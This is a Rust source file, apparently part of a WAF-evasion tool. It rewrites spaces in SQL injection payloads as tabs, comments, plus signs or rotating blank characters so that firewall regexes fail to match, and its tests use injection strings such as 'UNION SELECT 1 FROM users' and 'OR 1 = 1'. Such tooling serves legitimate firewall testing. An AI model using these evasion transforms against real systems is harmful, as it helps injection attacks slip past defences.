//! Space-replacement strategies.
use wafrift_types::hash::{FNV_PRIME_64, fnv1a_64};

const SQL_BLANK_CHARS: &[char] = &['\t', '\n', '\r', '\x0b', '\x0c'];

/// Insert tab characters BETWEEN tokens by replacing spaces with tabs.
///
/// Preserves keyword integrity while breaking WAF regex matching on space-separated tokens.
pub fn whitespace_insert(payload: &str) -> String {
    payload.replace(' ', "\t")
}

/// Replace spaces with SQL comments (`/**/`).
pub fn space_to_comment(payload: &str) -> String {
    payload.replace(' ', "/**/")
}

/// Replace spaces with dash comments (`--\n`).
pub fn space_to_dash(payload: &str) -> String {
    payload.replace(' ', "--\n")
}

/// Replace spaces with MySQL hash line comments (`#\n`).
///
/// `#` is MySQL's line-comment marker and extends to end-of-line.
/// Pre-fix this replaced spaces with bare `#`, which CONSUMED THE
/// REST OF THE PAYLOAD as a single comment — `SELECT * FROM users`
/// became `SELECT#*#FROM#users` which the SQL parser reads as just
/// `SELECT` followed by one giant comment to end-of-input. The
/// payload effectively shipped as `SELECT` (invalid SQL, no
/// injection delivered).
///
/// Adding the trailing `\n` makes `#\n` a zero-content line comment
/// that ends immediately, leaving the following token outside —
/// the same pattern `space_to_dash` uses with `--\n`. Result:
/// MySQL parses the payload as whitespace-separated tokens that
/// happen to have inline line-comment fillers between them.
pub fn space_to_hash(payload: &str) -> String {
    payload.replace(' ', "#\n")
}

/// Replace spaces with plus signs (`+`).
pub fn space_to_plus(payload: &str) -> String {
    payload.replace(' ', "+")
}

/// Replace spaces with rotating SQL-blank characters (`\t \n \r \x0b \x0c`).
///
/// F140: pre-fix used `rand::thread_rng().choose(...)`, so the same input
/// produced different outputs across calls — a successful bypass could not
/// be replayed and no regression test could pin its bytes. Same hazard
/// fixed in `parameter_pollute` (F114) and `whitespace_pad` (F136). The
/// pick is now driven by an FNV-1a hash of the full payload mixed with the
/// space-position index, so identical input is byte-identical output and a
/// captured bypass is reproducible.
///
/// §1 SPEED: uses canonical `fnv1a_64()` instead of a duplicate inline fold,
/// and pre-sizes the output to `payload.len()` (single-byte replacements keep
/// length constant). §7 DEDUP: the inline fold was byte-identical to `fnv1a_64`.
pub fn space_to_random_blank(payload: &str) -> String {
    // Canonical one-shot FNV-1a — §7 DEDUP eliminates the duplicate inline fold.
    let seed: u64 = fnv1a_64(payload.as_bytes());
    let mut out = String::with_capacity(payload.len());
    for (i, c) in payload.chars().enumerate() {
        if c == ' ' {
            let pick = seed.wrapping_add(i as u64).wrapping_mul(FNV_PRIME_64);
            out.push(SQL_BLANK_CHARS[(pick as usize) % SQL_BLANK_CHARS.len()]);
        } else {
            out.push(c);
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn whitespace_insert_replaces_spaces() {
        assert_eq!(whitespace_insert("SELECT * FROM"), "SELECT\t*\tFROM");
    }

    #[test]
    fn space_to_comment_replaces_spaces() {
        assert_eq!(space_to_comment("SELECT * FROM"), "SELECT/**/*/**/FROM");
    }

    #[test]
    fn space_to_dash_replaces_spaces() {
        assert_eq!(space_to_dash("SELECT * FROM"), "SELECT--\n*--\nFROM");
    }

    #[test]
    fn space_to_hash_replaces_spaces_with_terminated_line_comment() {
        // Each space becomes `#\n` (hash + newline). The newline
        // terminates MySQL's line comment so subsequent tokens
        // survive — pre-fix this used bare `#` which consumed the
        // rest of the payload as a single comment, leaving only
        // the first token. Regression test for F53(b).
        assert_eq!(
            space_to_hash("SELECT * FROM"),
            "SELECT#\n*#\nFROM",
            "must end the # comment with a newline so * and FROM survive"
        );
        // Sanity: the output still contains every original keyword.
        let out = space_to_hash("UNION SELECT 1 FROM users");
        for kw in ["UNION", "SELECT", "1", "FROM", "users"] {
            assert!(out.contains(kw), "{kw} dropped from payload: {out}");
        }
    }

    #[test]
    fn space_to_plus_replaces_spaces() {
        assert_eq!(space_to_plus("SELECT * FROM"), "SELECT+*+FROM");
    }

    #[test]
    fn space_to_random_blank_replaces_spaces() {
        let result = space_to_random_blank("SELECT * FROM");
        assert!(!result.contains(' '));
        assert_eq!(result.len(), "SELECT * FROM".len());
    }

    #[test]
    fn space_to_random_blank_is_deterministic() {
        // F140 regression: pre-fix `rand::thread_rng().choose` made
        // identical input produce different output, so a successful
        // bypass discovered via space_to_random_blank could not be
        // replayed — same hazard fixed in parameter_pollute (F114)
        // and whitespace_pad (F136). Post-fix FNV-1a hash drives the
        // pick so the same input is byte-identical output.
        let a = space_to_random_blank("SELECT * FROM users");
        let b = space_to_random_blank("SELECT * FROM users");
        assert_eq!(a, b, "space_to_random_blank must be deterministic");
    }

    #[test]
    fn space_to_random_blank_uses_more_than_one_blank() {
        // The whole point of "random blank" is to exercise multiple
        // chars from SQL_BLANK_CHARS, not collapse to one. With a
        // many-space payload across diverse runs, every char in the
        // table should appear at least once.
        let mut seen = std::collections::HashSet::new();
        for payload in [
            "a b c d e f g h i j",
            "x y z 1 2 3 4 5 6 7",
            "UNION SELECT 1 2 3 4 5 FROM dual t1 t2",
            "INSERT INTO t VALUES 1 2 3 4 5",
            "WHERE id = 1 OR 1 = 1 AND 2 = 2",
        ] {
            for c in space_to_random_blank(payload).chars() {
                if SQL_BLANK_CHARS.contains(&c) {
                    seen.insert(c);
                }
            }
        }
        assert!(
            seen.len() >= 3,
            "space_to_random_blank should rotate through at least 3 of 5 blank chars across diverse payloads, saw {seen:?}"
        );
    }
}
